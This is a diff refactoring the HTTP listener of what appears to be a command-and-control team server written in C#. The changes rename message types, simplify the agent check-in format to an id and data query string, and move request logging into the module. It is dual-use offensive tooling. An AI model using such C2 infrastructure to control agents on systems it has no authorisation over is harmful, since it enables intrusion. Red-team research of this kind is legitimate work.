@@ -4,66 +4,67 @@ using System.Text;
 using System.Threading;
 using System.Net.Sockets;
 using System.Collections.Generic;
+using System.Text.RegularExpressions;
+
+using C2.Models;
 
 using TeamServer.Models;
 using TeamServer.Interfaces;
 using TeamServer.Controllers;
 
-
 namespace TeamServer.Modules
 {
     public class HTTPCommModule : ICommModule
     {
+        protected AgentController AgentController { get; set; }
+        protected Socket Socket { get; set; }
+
         protected const int ChunkLength = 1024;
-        
-        protected Queue<C2Data> outboundData = new Queue<C2Data>();
-        protected Queue<C2Data> inboundData = new Queue<C2Data>();
+        protected Queue<AgentMessage> outboundData = new Queue<AgentMessage>();
+        protected Queue<AgentMessage> inboundData = new Queue<AgentMessage>();
         protected Queue<string> outboundChunks = new Queue<string>();
 
-        protected Socket socket;
-        protected AgentController agentController;
-
-        public void Initialise(AgentController agentController)
+        public void Initialise(AgentController AgentController)
         {
-            this.agentController = agentController;
+            this.AgentController = AgentController;
         }
 
         public void Start()
         {
             // Set up our HTTP socket
-            socket = new Socket(SocketType.Stream, ProtocolType.IP);
-            socket.Bind(new IPEndPoint(IPAddress.Parse("0.0.0.0"), 8080));
-            socket.Listen(20);
+            Socket = new Socket(SocketType.Stream, ProtocolType.IP);
+            Socket.Bind(new IPEndPoint(IPAddress.Parse("0.0.0.0"), 8080));
+            Socket.Listen(20);
 
             // Execute within thread to avoid this call from blocking
             Thread t = new Thread(delegate (object param)
             {
                 while (true)
                 {
-                    Socket clientSocket = socket.Accept();
+                    Socket clientSocket = Socket.Accept();
                     AgentHandler(clientSocket as Socket);
                 }
             });
 
-            t.Start(socket);
+            t.Start(Socket);
         }
 
-        public bool RecvData(out C2Data data)
+        public bool RecvData(out AgentMessage message)
         {
             if (inboundData.Count > 0)
             {
-                data = inboundData.Dequeue();
+                message = inboundData.Dequeue();
                 return true;
             }
 
-            data = null;
+            message = null;
             return false;
         }
 
-        public bool SendData(C2Data data)
+        public bool SendData(AgentMessage message)
         {
             var chunkId = Helpers.GenerateRandomString(10);
-            var sessionData = agentController.GetSession(data.AgentId);
+            var sessionData = AgentController.GetSession(message.AgentId);
 
             // Add "outboundChunks" property if it doesn't exist for this agent
             if (sessionData.datastore.ContainsKey("outboundChunks") == false)
@@ -71,17 +72,15 @@ namespace TeamServer.Modules
 
             var outboundChunks = sessionData.datastore["outboundChunks"] as Queue<HTTPChunk>;
 
-            for (int i = 0; i <= data.Data.Length; i += ChunkLength)
+            for (int i = 0; i <= message.Data.Length; i += ChunkLength)
             {
-                if (i + ChunkLength >= data.Data.Length)
+                if (i + ChunkLength >= message.Data.Length)
                 {
                     outboundChunks.Enqueue(new HTTPChunk()
                     {
                         Id = chunkId,
-                        Module = data.Module,
-                        Command = data.Command,
-                        Data = data.Data[i..],
-                        Length = data.Data.Length - i,
+                        Data = message.Data[i..],
+                        Length = message.Data.Length - i,
                         Final = true
                     });
                 }
@@ -90,9 +89,7 @@ namespace TeamServer.Modules
                     outboundChunks.Enqueue(new HTTPChunk()
                     {
                         Id = chunkId,
-                        Module = data.Module,
-                        Command = data.Command,
-                        Data = data.Data.Substring(i, ChunkLength),
+                        Data = message.Data.Substring(i, ChunkLength),
                         Length = ChunkLength,
                         Final = false
                     });
@@ -144,20 +141,18 @@ namespace TeamServer.Modules
         {
             var agentId = string.Empty;
 
-            var re = System.Text.RegularExpressions.Regex.Match(request, "GET /\\?module=([^&]+)&command=([^&]+)&data=([^&]*)&agentid=([^\\s]+)");
+            var re = Regex.Match(request, "GET /\\?id=([^&]+)&data=([^\\s]+)");
             if (re.Captures.Count > 0)
             {
-                inboundData.Enqueue(new C2Data()
+                inboundData.Enqueue(new AgentMessage
                 {
-                    Module = re.Groups[1].Value,
-                    Command = re.Groups[2].Value,
-                    Data = re.Groups[3].Value,
-                    AgentId = agentId = re.Groups[4].Value
+                    AgentId = agentId = re.Groups[1].Value,
+                    Data = re.Groups[2].Value,
                 });
             }
             else
             {
-                Program.ServerController.LogWebRequest(request);
+                LogWebRequest(request);
             }
 
             return agentId;
@@ -167,7 +162,7 @@ namespace TeamServer.Modules
         {
             byte[] response;
 
-            var sessionData = agentController.GetSession(agentId);
+            var sessionData = AgentController.GetSession(agentId);
             if (sessionData.datastore.ContainsKey("outboundChunks") == false)
                 return Encoding.ASCII.GetBytes("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nmodule=core&command=nop");
 
@@ -176,7 +171,7 @@ namespace TeamServer.Modules
             if (outboundChunks.Count > 0)
             {
                 var outData = outboundChunks.Dequeue();
-                response = Encoding.ASCII.GetBytes(string.Format("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nmodule={0}&command={1}&data={2}&id={3}&final={4}", outData.Module, outData.Command, outData.Data, outData.Id, outData.Final));
+                response = Encoding.ASCII.GetBytes(string.Format("HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nid={0}&data={1}&final={2}", outData.Id, outData.Data, outData.Final));
             }
             else
             {
@@ -184,6 +179,15 @@ namespace TeamServer.Modules
             }
 
             return response;
+        }
+
+        private void LogWebRequest(string request)
+        {
+            Program.ServerController.AddWebLog(new WebLog
+            {
+                Time = DateTime.UtcNow,
+                Request = request.Replace("\r\n", " ").Replace("\0", "").TrimEnd()
+            });
         }
     }
 }
